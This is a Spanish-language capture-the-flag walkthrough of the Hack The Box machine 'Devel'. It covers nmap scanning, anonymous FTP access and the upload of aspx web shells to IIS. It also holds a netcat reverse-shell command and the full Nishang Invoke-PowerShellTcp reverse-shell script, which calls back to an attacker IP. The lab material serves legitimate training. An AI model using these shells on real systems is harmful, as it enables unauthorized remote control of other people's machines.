# Devel

## NMAP 

```
batcat -l ruby Scan
nmap -sCV -Pn -O -A -p21,80 -oN Scan 10.129.7.194
```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/f4235216-32cf-4ccd-a556-c1ed94f370aa)


## ftp 

Necesitamos conectarnos al ftp y primero con sesiones nulas

```
ftp 10.129.8.38
user:anonymous
pass:anonymous
help
ls -la
```

Enumerando un poco

```
whatweb http://10.129.8.38
curl -I -s http://10.129.8.38
curl -I -s -X GET http://10.129.8.38

```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/dddc2d45-6951-499e-bde9-663b85777836)

Esto quiere decir que puede interpretar .aspx

## RCE

Nos damos cuenta que el ftp esta conectad con el iispor lo que vamos a hacer es subir una shell Kali tienen varias...

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/6f85e96d-132a-4358-9bd1-d686098fad64)


```
sudo updatedb
locate *aspx* 
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
```

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/da9afa8e-abba-48ec-9a7f-c1b450bd775a)

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/18167bd9-6a6c-4f08-b6e7-2502b237183b)

### Compartir archivos a windows

Podemos montar una carpeta compartida en Kali y acceder desde Windows para esto se va a usar impacket-smbserver:

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/0241faf2-95a9-4db7-97a2-dbcef62954e1)


```
impacket-smbserver smbFolder $(pwd)

```

Desde Windows ya sea un cmd o un ps puedes usar 

```
copy \\10.10.14.90\smbFolder\archivo

```

## RCE via nc

En kali seclist tiene nc.exe


```
\\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443

```

### RCE via Nishang (via Invoke-PowerShellTcp.ps1)

![image](https://github.com/gecr07/Devel-HTB/assets/63270579/c1c683b6-fb64-4ff5-990c-a081247f9564)

Entonces ponemos es linea hasta abajo del archivo con nuestra IP

```powershell

function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 4444


```


![image](https://github.com/gecr07/Devel-HTB/assets/63270579/efb2a3c0-8208-4f8e-a911-8bb0336b5699)


















































































































































